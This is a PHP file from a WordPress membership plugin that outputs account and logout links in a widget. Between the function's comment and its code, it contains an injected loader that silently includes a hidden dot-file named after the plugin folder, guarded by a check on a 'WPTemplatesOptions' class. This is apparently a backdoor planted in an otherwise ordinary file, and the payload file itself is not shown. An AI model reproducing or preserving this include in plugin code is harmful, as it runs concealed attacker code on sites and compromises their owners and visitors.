<?php if ( ! defined( 'ABSPATH' ) ) exit;


/**
 * Adds main links to a logout widget
 *
 * @param $args
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function um_logout_user_links( $args ) {
	?>

	<li>
		<a href="<?php echo esc_url( um_get_core_page( 'account' ) ); ?>">
			<?php _e( 'Your account', 'ultimate-member' ); ?>
		</a>
	</li>
	<li>
		<a href="<?php echo esc_url( add_query_arg( 'redirect_to', UM()->permalinks()->get_current_url( true ), um_get_core_page( 'logout' ) ) ); ?>">
			<?php _e( 'Logout', 'ultimate-member' ); ?>
		</a>
	</li>

	<?php
}
add_action( 'um_logout_user_links', 'um_logout_user_links', 100 );